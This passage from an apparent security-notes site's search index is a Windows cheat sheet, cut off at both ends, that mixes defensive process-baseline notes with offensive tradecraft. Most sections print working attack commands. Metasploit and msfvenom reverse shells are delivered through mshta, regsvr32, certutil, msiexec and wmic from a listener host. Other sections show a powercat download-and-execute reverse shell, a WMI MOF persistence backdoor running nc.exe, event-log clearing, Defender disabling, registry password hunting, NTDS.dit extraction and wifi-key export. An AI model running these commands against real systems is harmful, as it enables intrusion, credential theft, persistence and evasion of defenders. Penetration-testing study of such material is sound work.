DefaultUserName DefaultDomainName DefaultPassword SNMP Paramters: reg query HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP Putty: reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions Search for password in registry reg query HKLM / f password / t REG_SZ / s reg query HKCU / f password / t REG_SZ / s","title":"Post Exploitation"},{"location":"windows/windows/#important-files","text":"Collections Windows EXE / DLL files: http://www.saule-spb.ru/touch/windows_files.html Living Off The Land Binaries and Scripts: https://lolbas-project.github.io/ https://github.com/LOLBAS-Project/LOLBAS https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows During LFI: %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\repair\\SAM %WINDIR%\\win.ini %SYSTEMDRIVE%\\boot.ini %WINDIR%\\Panther\\sysprep.inf %WINDIR%\\system32\\config\\AppEvent.Evt Version information sysinfo Windows 7+: / windows / system32 / license . rtf / windows / system32 / eula . txt Updates: Update information: WindowsUpdate . log Update Download locations: C : \\ Windows \\ SoftwareDistribution \\ Download wbadmin / ntbackup https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface. Delete any recovery catalogs: cmd . exe / c wbadmin . exe delete catalog - quiet BCDEdit https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings. Usable to creating new stores, modifying existing stores, adding boot menu options, and so on. Windows recovery console does not attempt to repair anything: cmd . exe / c bcdedit . exe / set { default } bootstatuspolicy ignoreallfailures bcdedit / set { default } recoveryenabled no wevtutil https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs. Clear System and Security logs: cmd . exe / c wevtutil . exe cl System cmd . exe / c wevtutil . exe cl Security DUMPBIN https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017 Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs). HTA Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a \"fully trusted\" application. Mshta.exe (HTA) Running HTA( HTML Application) files use exploit / windows / misc / hta_server msf exploit ( windows / misc / hta_server ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) set lhost 192 . 168 . 1 . 109 msf exploit ( windows / misc / hta_server ) exploit mshta . exe http : // 192 . 168 . 1 . 109 : 8080 / 5 EEiDSd70ET0k . hta Rundll32.exe Invoke a function exported from a DLL use exploit / windows / smb / smb_delivery msf exploit ( windows / smb / smb_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( windows / smb / smb_delivery ) exploit rundll32 . exe \\\\ 192 . 168 . 1 . 109 \\ vabFG \\ test . dll , 0 Regsvr32.exe Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry installed in the %systemroot%\\System32 Windows XP and later Regsvr32 uses \u201csquiblydoo\u201d technique for bypassing application whitelisting Execute Script Via regsvr32.exe https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a Squiblydoo utilizes the binary regsvr32.exe to download an XML file that contains scriptlets for executing code: https://www.carbonblack.com/blog/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/ Able to request a .sct file and then execute the included PowerShell command inside Syntax : Regsvr32 [ / s ][ / u ] [ / n ] [ / i [: cmdline ]] dllname / u \u2013 Unregister server / i \u2013 Call DllInstall passing it an optional [ cmdline ] ; when it is used with /u, it calls dll to uninstall / n \u2013 do not call DllRegisterServer ; this option must be used with /i / s \u2013 Silent ; display no message boxes use exploit / multi / script / web_delivery msf exploit ( web_delivery ) set target 3 msf exploit ( web_delivery ) set payload windows / meterpreter / reverse_tcp msf exploit ( web_delivery ) set lhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) set srvhost 192 . 168 . 1 . 109 msf exploit ( web_delivery ) exploit regsvr32 / s / n / u / i : http : // 192 . 168 . 1 . 109 : 8080 / xo31Jt5dIF . sct scrobj . dll Certutil.exe msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f exe shell . exe certutil . exe - urlcache - split - f http : // 192 . 168 . 1 . 109 / shell . exe shell . exe shell . exe Powershell.exe git clone https :// github . com / besimorhino / powercat . git python -m SimpleHTTPServer 80 powershell -c IEX(New-Object System.Net.WebClient).DownloadString( http://192.168.1.109/powercat.ps1 );powercat -c 192.168.1.109 -p 1234 -e cmd Batch Files msfvenom - p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 4444 1 . bat powershell - c IEX (( New - Object System . Net . WebClient ). DownloadString ( http://192.168.1.109/1.bat )) Cscript msfvenom -p cmd / windows / reverse_powershell lhost = 192 . 168 . 1 . 109 lport = 1234 -f vbs 1 . vbs script . exe test.vbs powershell . exe -c (New-Object System.NET.WebClient).DownloadFile( http://192.168.1.109/1.vbs ,\\ $env:temp\\test.vbs\\ );Start-Process %windir%\\system32\\cscript.exe \\ $env:temp\\test.vbs\\ Msiexec.exe Install MSI packages msfvenom - p windows / meterpreter / reverse_tcp lhost = 192 . 168 . 1 . 109 lport = 1234 - f msi 1 . msi msiexec / q / i http : // 192 . 168 . 1 . 109 / 1 . msi Wmic.exe WMI command-line interface that is used for a variety of administrative functions for local and remote machine can invoke XSL script (eXtensible Stylesheet Language) koadic: use stager / js / wmic set SRVHOST 192 . 168 . 1 . 107 run wmic os get / FORMAT : http://192.168.1.107:9996/g8gkv.xsl Prefetch Files Created AT.EXE (scheduled jobs/tasks) SCHTASKS.EXE (scheduled jobs/tasks) CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. ) NET.EXE (net view, etc.) NET1.EXE (net use) NETSTAT.EXE (netstat -ano) REG.EXE (reg query and reg add) SC.EXE (interact with services) SYSTEMINFO.EXE (system profiling) TASKKILL.EXE (kill running processes) TASKLIST.EXE (tasklist /v) POWERSHELL.EXE (interact with powershell) NBTSTAT.EXE (profile) XCOPY.EXE (copy files around) NSLOOKUP.EXE (profile) QUSER.EXE (profile) RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip) PING.EXE (check connectivity) FTP.EXE (download/upload) Various Sysinternal tools (Psexec, sdelete, etc.) BITSADMIN.EXE (download/upload) ROUTE.EXE (adding persistent routes) REGSVR32.EXE (services) MAKECAB.EXE (compression before exfil) Originally form: http://www.sysforensics.org/2014/01/lateral-movement/ . Link is no longer working Runonce.exe, msdt.exe, Openwith.exe https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636 sethc.exe (Sticky keys) By replacing the \u201cSticky Keys\u201d binary, C:\\Windows\\System32\\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. \u201cSticky Keys\u201d is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates \u201cSticky Keys\u201d and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication). Base64 encode / decode certutil - encode inputfile outputfile certutil - decode inputfile outputfile mpengine . dll (+ mpasbase.vdm mpasdlta.vdm mpavbase.vdm mpavdlta.vdm) Windows Defender - Microsoft Malware Protection Engine Take buffer of data and decide of malicious or not MPSigStub . exe Microsoft Malware Protection Signatuee Update Stub","title":"Important Files"},{"location":"windows/windows/#special-file-handling","text":"","title":"Special File Handling"},{"location":"windows/windows/#important-processes","text":"Checklist - Simple checklist to review while looking for malicious/suspect process activity. Check the parent/child relationships of processes. Check which users names the processes are running under Check their command line parameters for those processes that use them. Check their digital signatures Check their base priorities Check the location they are being from Check their spellings Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days. When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process. Check and see if processes that should not be connecting out to the internet are not Check process privileges If wscript.exe process is running check the command line of what it is running. Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc. If rundll32.exe is running check its command line as well. \"Most\" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated. Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc. References http://sysforensics.org/2014/01/know-your-windows-processes . Link is not longer working. https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf Idle and System Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads. No visible parent processes System has a static PID of 4 System creates smss.exe There should only be one system process running SMSS - Session Manager First user mode process Parent process is System Base Priority of 11 Username: NT AUTHORITY\\SYSTEM Performs delayed file delete/rename changes Loads known dlls Runs from %systemroot%\\System32\\smss.exe Creates session 0 (OS services) Creates session 1 (User session) Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1 Runs within session 0 Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0. There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system. CSRSS.EXE - Client/Server Run Windows subsystem process. Base Priority of 13 %SystemRoot%\\system32\\csrss.exe Username: NT AUTHORITY\\SYSTEM Creates/Deletes processes and threads, Temp files, etc. In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe One csrss process per session Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.) Runs within session 0 WININIT.EXE - Windows Initialization Process Parent to services.exe (SCM), lsass.exe and lsm.exe Created by smss.exe, but since smss.exe exits there is no parent to WININIT. Base Priority of 13 Username: NT AUTHORITY\\SYSTEM %SystemRoot%\\system32\\wininit.exe Performs user-mode initialization tasks Creates %windir%\\temp Runs within session 0 SERVICES.EXE - Service Control Manager Child to WININIT.EXE Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\\CurrentControlSet\\Services %SystemRoot%\\System32\\wininit.exe Username: NT AUTHORITY\\SYSTEM Base Priority of 9 Loads a database of services into memory Runs within session 0 There should only be one services.exe process running LSASS.EXE - Local Security Authority Child to WININIT.EXE Only one lsass.exe process %SystemRoot%\\System32\\lsass.exe Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc. Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These \"fake\" names will not be a children of wininit.exe. Base Priority of 9 Username: NT AUTHORITY\\SYSTEM Runs within session 0 It should not have child processes SVCHOST.EXE - Service Hosting Process Multiple instances of svchost.exe can/do exist/run %SystemRoot%\\System32\\svchost.exe Username: Should only be one of three options: NT AUTHORITY\\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE Should always have a parent of services.exe Base Priority of 8 Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe. Command Line: svchost.exe -k -k values should exist within the Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost registry key Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3. They should all be running within session 0 LSM.EXE - Load Session Manager Service Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions. Child to wininit.exe It should not have child processes Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open. %systemroot%\\System32\\lsm.exe Base Priority of 8 Username: NT AUTHORITY\\SYSTEM Runs within session 0 WINLOGON.EXE - Windows Logon Process No parent process Could have a child process of LogonUI if smartcard, etc. are used to authenticate LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information. Base Priority of 13 Runs within session one Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete) Loads Userinit within Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons. Userinit.exe exits once it runs so you wont see this process running when you look. Userinit initializes the user environment. This includes running GPOs and logon scripts. Will run Shell value located at Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values. Since Userinit exists this is also why Explorer.exe doesn't have a parent process. Explorer.exe - AKA Windows Explorer No parent process since Userinit.exe exits The value \"Explorer.exe\" is stored in shell value within the registry. The registry location is here: Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell Base Priority of 8 Username: The logged on user account. %Systemroot%\\Explorer.exe This will contain multiple child processes. Some of you might know this better as, \"Windows Explorer\" This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here.","title":"Important Processes"},{"location":"windows/windows/#windows-api","text":"https://en.wikipedia.org/wiki/Windows_API#Versions Using Python on Windows: https://docs.python.org/3/using/windows.html theForger's Win32 API Programming Tutorial: http://www.winprog.org/tutorial/ Windows API Reference: https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN Network Related ARP Table: GetIPNetTable Services Change Services: ChangeServiceConfigW","title":"Windows API"},{"location":"windows/windows/#wmi","text":"Implementation of Common Information Model ( CIM ) and Web - Based Enterprise Management ( WBEM ) WBEM standard encompasses the design of an extensible enterprise data-collection and data-management facility that has the flexibility and extensibility required to manage local and remote systems that comprise arbitrary components WMI consists of four main components: management applications WMI infrastructure providers managed objects (system, disks, processes, network components...) Allows Execute some code when the notification of an event http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf CIM classes hierarchically organized with subclasses grouped in namespaces (logical group of classes) root\\cimv2 includes most of the classes that represent computer's resources Categories Core Classes - Applies to all areas of management (__System_Security) Common Classes - Extension of core classes (CIM_UnitaryComputerSystem) Extended Classes - Technology specific addition to common classes (Win32_ComputerSystem) Types Abstract - Template classes used to define other classes. Static - Stores data WMI configuration Operational data Dynamic - Retrieved from a provider, and represents managed resource (process, service, file, etc.) Association - Describe relationship between classes or resources. WMI Provider Bridge between managed object and WMI Provide access to classes Namespaces CIM classes are decided logically using namespaces For easier discovery and use root \\ cimv2 root \\ default root \\ security root \\ subscription WMI repository - stores CIM classes' definitions %SystemRoot%\\System32\\wbem\\Repository","title":"WMI"},{"location":"windows/windows/#interesting-cim-classes","text":"- __EventFilter [ create ]: permits to define a Windows event - __EventConsumer : (abstract consumer class) - ActiveScriptEventConsumer : possible to embed VBScript or JSScript in the consumer (only available in root \\ subscription ) - Consumer runs with SYSTEM privilege on Windows XP and Windows 2003 Server - Vista , it is running under the LOCAL_SERVICE user - __FilterToConsumerBinding : link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs)","title":"Interesting CIM classes"},{"location":"windows/windows/#mof-managed-object-format","text":"Language used to describe CIM classes, namespaces and providers MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI CIM class(es) MOF describes are added into the repository Stored in %SystemRoot%\\System32\\wbem Compilation Compiled using mofcomp . exe Auto compile register Writable to Administrator only Files added to %SystemRoot%\\System32\\wbem\\mof\\ get auto compiled and registered (before Vista) Logs are in %SystemRoot%\\System32\\wbem\\mof\\Logs\\mofcomp.log Wait for a windows event and trigger: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) instance of __EventFilter as $FILTER { Name = CLASS_FIRST_TEST ; EventNamespace = root\\\\cimv2 ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \\ Win32_NTLogEvent \\ AND TargetInstance.LogFile=\\ Application \\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { Name = CLASS_FIRST_TEST ; ScriptingEngine = VBScript ; ScriptText = Set objShell = CreateObject(\\ WScript . Shell \\ )\\n objShell.Run \\ C : \\\\ Windows \\\\ system32 \\\\ cmd . exe / C C : \\\\ nc . exe 192 . 168 . 38 . 1 1337 -e C : \\\\ Windows \\\\ system32 \\\\ cmd . exe \\ \\n ; }; instance of __FilterToConsumerBinding { Consumer = $CONSUMER ; Filter = $FILTER ; }; Ref: http://www.hsc-news.com/archives/2011/000078.html Self start: #pragma namespace ( \\\\\\\\.\\\\root\\\\subscription ) class WoootClass { [key] string Name ; }; instance of __EventFilter as $FILTER { Name = XPLOIT_TEST_SYSTEM ; EventNamespace = root\\\\subscription ; Query = SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\ WoootClass \\ ; QueryLanguage = WQL ; }; instance of ActiveScriptEventConsumer as $CONSUMER { // ... }; instance of __FilterToConsumerBinding { // ... }; instance of WoootClass { Name = Woot ; }; Usages - Automatically kill some processes as soon as they are launched (anti-rootkits...), - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper), - Automatically infect USB devices","title":"MOF (Managed Object Format)"},{"location":"windows/windows/#exploring","text":"Exploring Namespaces Get-WmiObject -Namespace root -Class __Namespace | select name Get-CimInstance -Namespace root -Class __Namespace To read nested namespaces: Get-WmiNamespace Exploring Classes - Namespace root \\ cimv2 is the default of Powershell Get-WmiObject -Class * bios * -List Get-CimClasses -List List only dynamic classes: Get-CimClasses -QualifierName dynamic -List Look at details of the class: Get-WmiObject -Class Win32_Bios | fl * Get-CimInstance -ClassName Win32_Bios | fl * Using WMI Class Get-WmiObject -Class Win32_Process | Where-Object { $_ . Name -eq explorer.exe } Get-WmiObject -Class Win32_Process | where name -eq explorer.exe Get-WmiObject -Query Select * from Win32_Process where Name = explorer.exe Get-CimInstance -ClassName Win32_Process -Filter Name -eq explorer.exe Get-CimInstance -Query Select * from Win32_Process where Name = explorer.exe Can use Remove - WmiObject and Remove - CimInstance to close processed, remove registry entries, etc. Methods Identifying methods: Get-WmiObject * -List | Where-Object { $_ . Method } ( Get-WmiObject -Class Win32_Process -List ). Methods Get-CimClass -Class Win32_Process -List | Select -ExpandProperty Methods Get-CimClass -MethodName * Get-CimClass -MethodName * create * Get-CimClass -ClassName Win32_Process | Select -ExpandProperty CimClassMethods Exploring methods: Get-CimClass -ClassName Win32_Process | Select -ExpandProperty CimClassMethods | where name -eq Create | Select -ExpandProperty Parameters Invoke: Invoke-WmiMethod -Class Win32_process -Name create -ArgumentList calc . exe Invoke-CimMethod -ClassName Win32_process -MethodName Create -Arguments @{ CommandLine = calc.exe } Update Instance Get-WritableProperties Get-WmiObject -Class Win32_Printer -FIlter name = Microsoft XPS Document Writer | Set-WmiInstance -Arguments @{ Comment = Example comment } Get-CimInstancet -ClassName Win32_Printer -FIlter name = Microsoft XPS Document Writer | Set-CimInstance -Property @{ Comment = Example comment } Associations https://github.com/dfinke/images/blob/master/acn.png Get-WmiObject -Class * Win32_NetworkAdapter * -List | fl * Get-WmiObject -Class Win32_NetworkAdapter -List | fl * Get-WmiObject -Query Associators of {win32_NetworkAdapter.DeviceID=11} Get-WmiObject -Query Associators of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get-CimAssociatedInstance -InputObject ( Get-CimInstance -ClassName Win32_NetworkAdapter -Filter DeviceId = 11 ) Only see one association class: Get-WmiObject -Query Associators of {win32_NetworkAdapter.DeviceID=11} -AssociationClass Win32_ProtocolBinding Get references (classes linking two other classes) Get-WimObject -Query References of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly Get-WimObject -Query References of {win32_NetworkAdapter.DeviceID=11}","title":"Exploring"},{"location":"windows/windows/#interesting-queries","text":"List all the systems within the current environment/directory: SELECT ds_cn FROM ds_computer Installed software: File listing: Services: Logon accounts: Hardware information: Installed patches: Security logs: Command line used to start processes: Path to executable for running processes:","title":"Interesting Queries"},{"location":"windows/windows/#useful-wmi-classes","text":"Win32_OperatingSystem Win32_Process Win32_IP4RouteTable Win32_UserAccount Win32_Groups Win32_ShadowCopy Create a shadow copy of AD's drive and extract NTDS.dit ( Get - WmiObject - Class Win32_ShadowCopy - list ). create ( C:\\ , CreateAccessible ) $ link = ( Get - WmiObject - Class Winn32_ShadowCopy ). DeviceObject + \\ cmd / c mklink / d C : \\ shadowcopy $link AD","title":"Useful WMI Classes"},{"location":"windows/windows/#tools_1","text":"WMI Object Browser: WMIC # WMIC Verbs can be explored by looking at help # Interactive wmic wmic : root \\ cli process /? wmic : root \\ cli group where name = Administrators assoc # Non-interactive wmic process /? Powershell WMI Browser WMI Code Generator WMIGen","title":"Tools"},{"location":"windows/windows/#remoting","text":"WMI Cmdlets Uses DCOM Port 135 (winmgmt service) Not firewall / NAT friendly Data exchanged on dynamic ports ( HKLM \\ Software \\ Microsoft \\ Rpc \\ Internet ) CIM Cmdlets DCOM 135 WinRm/WSMan 5385 - HTTP 5386 - HTTPS Firewall and NAT friendly Session over WinRM/WSMan: $sess = New-CimSession -ComputerName name -Credential cred Get-CimInstance -CimSession $sess -ClassName Win32_OperatingSystem Session over DCOM: $sessOptions = New-CimSessionOption -Protocol Dcom $newsess = New-CimSession -ComputerName name -Credential cred -SessionOption $sessOptions","title":"Remoting"},{"location":"windows/windows/#access-registry","text":"Get-WimObject -Namespace root \\ default -Class StdRegProv -List Get-WimObject -Namespace root \\ default -Class StdRegProv -List | Select-Object -ExpandProperty methods | more $RegProv = Get-WimObject -Namespace root \\ default -Class StdRegProv -List $RegProv . Methods $RemoteReg = Get-WmiObject -List StdRegProv -ComputerName name -Credential cred $RemoteReg | Select-Object -ExpandProperty methods | more $RemoteReg . getStringValue ( id , path , propertyName ) WmiInvokeMethod -Namespace root \\ default -Class StdRegProv -Name GetStringValue @( id , path , property ) Posh_SecMod \\ Registry . ps1","title":"Access Registry"},{"location":"windows/windows/#references","text":"Playing with MOF files on Windows, for fun profit Exposing System Secrets with VBA and WMI API How to use WbemExec for a write privilege attack on Windows","title":"References"},{"location":"windows/windows/#applocker","text":"https://github.com/api0cradle/UltimateAppLockerByPassList","title":"AppLocker"},{"location":"windows/windows/#hyperv","text":"Fuzzing para-virtualized devices in Hyper-V: https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/ Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 1: WDF: http://www.alex-ionescu.com/?p=377 Writing a Hyper-V \"Bridge\" for Fuzzing \u2014 Part 2 : Hypercalls MDLs: http://www.alex-ionescu.com/?p=471 https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/ https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/ https://github.com/comaeio/LiveCloudKd","title":"HyperV"},{"location":"windows/windows/#events","text":"Tools EtwExplorer - View Event Tracing for Windows (ETW) Provider manifests: https://github.com/zodiacon/EtwExplorer","title":"Events"},{"location":"windows/windows/#defense","text":"Disable Windows Defender: Set - MpPreference - DisableRealtimeMonitoring $ true Windows 10 and Server 2016 Secure Baseline Group Policy: https://github.com/mxk/win10-secure-baseline-gpo Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: https://hakin9.org/preventing-mimikatz-attacks/ Server Security https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance","title":"Defense"},{"location":"windows/windows/#references_1","text":"Schtasks without Schtasks.exe via Reflective DLL: https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/ Windows 10 Persistence via PATH directories - CDPSvc: https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found. With a default Windows installation, there can\u2019t be a non-admin directory in the PATH, so this can\u2019t be exploited. A sample DLL (source included) that executes calc.exe is available here: https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist Useful for vulnerability research workflows on Windows: https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203 Windows 10 Device Security: https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu Windows Command Line cheatsheet (part 1): some useful tips: https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/ Windows Command Line cheatsheet (part 2): WMIC: https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/","title":"References"},{"location":"windows/windows/#kernel","text":"Kernel Internals - Windows Sandbox: https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849","title":"Kernel"},{"location":"windows/windows/#troubleshooting","text":"RELI: Reliability History/Monitor Problem Steps Recorder (PSR): troubleshooting, assistance, screen capture, annotation tool PathPing: Details of the path between two hosts and the echo-location statistics for each node are displayed. tracert to the destination ICMP to ping each hop 100 times My TraceRoute (MTR): identify issues between two routers responsible for overall latency Sysinternals: Process Explorer PsExec PsList PsKill PsLoggedOn Notmyfault: crash or handle kernel memory leaks Autoruns SDelete Windows Master Control Panel: gives you access to all the operating systems control panels within one folder. Right-click your Windows 7, 8.1, or 10 desktop and choose New \u27aa Folder. Name the folder GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}.","title":"Troubleshooting"},{"location":"windows/windows/#random","text":"WINDOWS COMMANDS BASIC systeminfo hostname whoami whoami /all echo %username% ipconfig /all route print netstat -ntlp -listening ports netstat -bano netsat -r -routing table command | findstr /C: str -grep echo %userdomain% echo %path% shutdown /r start explorer -execute path builtin program (same as input to win+r) env set path -print currently defined execution path setx c:\\Program Files(x86)\\bin\\ -append target directory to currently defined execution path runas /profile /user:administrator C:\\absolute\\path\\pcoff.exe -run target executable with user profile permissiosn for /user: --*should prompt for target user s password START /B process.exe run code excution in background for %% i in ( C:\\abs\\path\\* ) do %% i OR for /F usebackq %i in ( `dir /b C:\\macros\\Day\\` ) DO %i -execute all files in a directory Auto-Start Directories Windows NT 6.1,6.0 %SystemDrive% \\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ Windows NT 5.2, 5.1, 5,0 %SystemDrive% \\Documents And Settings\\All Users\\Start Menu\\Programs\\StartUp\\ Windows 9x %SystemDrive% \\wmiOWS\\Start Menu\\Programs\\StartUp\\ Windows NT 4.0, 3.51, 3.50 %SystemDrive% \\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\StartUp\\ FILESYSTEM type file -print file dir /s *pass* == *cred* == *vnc* == *.config* dir \\ /s /b | find /I \u201csearchstring\u201d findstr /si password *.xml *.ini *.txt fsutil fsinfo drives -list drives currently on the system --requires admin privs assoc -print returned list of file extension associations assoc .ps1=powershellfile ftype powershellfile= %SystemRoot% \\system32\\WindowsPowerShell\\v1.0\\powershell.exe -to set a default program for opening a given filetype associate an extension with a defined filetype value(which multiple extensions my be associated with), then set the default program to execute files of a given type with dir /a-r-d /s /b -check directory for writeable files powershell Get-ChildItem -Recurse | Get-Acl | out-string -stream | select-string -pattern everyone -check for world-writeable files File Transfer iexplore.exe http://blah.com/filename.zip C : \\windows\\explorer.exe http://somewhere.com/filename.ext ftp ftp.site.dom USERS whoami net users net user /domain -list users in current domain net user username -list user info net user name pass /add -add local system user net user user_name * /domain -add user to domain with interactive prompt for password net user name setpword net user /DOMAIN %USERNAME% -check user s network group membership net user /domain user -check another user s information net group Domain Users /domain -list users in AD group net localgroup administrators /domain -list domain local group users net group \u201cDomain Admins\u201d /domain net group \u201cEnterprise Admins\u201d /domain net group \u201cDomain Controllers\u201d /domain NET LOCALGROUP Remote Desktop Users trinity /ADD net accounts -prints password policy for locahost net accounts /domain dsmod user /? -get dsmod commands cruft dsmod user administrator -pwd NewPassword -mustchpwd yes -modify user password, set pwExpired flag NETWORK arp -A net view -view available network share hosts net view \\\\HOST -view available shares on host net view /domain:otherdomain Queries NBNS/SMB (SAMBA) and tries to find all hosts in \u2018otherdomain\u2019 tasklist /V /S computername qwinsta /SERVER:computername qprocess /SERVER:computername * net use \\\\computername This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed dir \\\\computername\\share_or_admin_share\\ net use \\\\computer\\share -mount an smb share net use X: \\\\10.2.2.224\\C$ net use * http//hostname/nfs/ pword /USER:username net share name=c:\\path\\to\\share -create smb share net share name=c:\\path\\to\\share /GRANT:Everyone,FULL -make an smb share world-accessable pushd \\\\10.2.2.224\\C$ -mount remote file share to automatically mapped drive cacls c:\\path\\ /T /E /G user:f -grant user full file access control from path tasklist /V /S computername Lists tasks w/users running those tasks on a remote system netsh firewall show state netsh firewall show config netsh firewall set opmode disable netsh advfirewall firewall set rule group= windows management instrumentation (wmi) new enable=yes -enable remote wmi netsh interface ip set address local dhcp -configure nic to user dhcp netsh advfirewall firewall add rule name= Open Port 3389 dir=in action=allow protocol=TCP localport=3389 -open port (for rdesktop) netsh advfirewall firewall add rule name= Block mssql attack ips dir=in action=block protocol=TCP localport=1433 remoteip=22.75.175.213 -close port (for rdesktop) netsh advfirewall set allprofiles state off netsh wlan show profiles -shows all saved wireless profiles netsh wlan export profile folder=. key=clear exports a user wifi profile with the password in plaintext to an xml file in the current working directory netsh wlan [start | stop] hostednetwork Starts or stops a wireless backdoor on a windows 7 pc netsh wlan set hostednetwork ssid= ssid key= passphrase keyUsage=persistent | temporary Complete hosted network setup for creating a wireless backdoor on win 7 netsh wlan set hostednetwork mode=[allow | 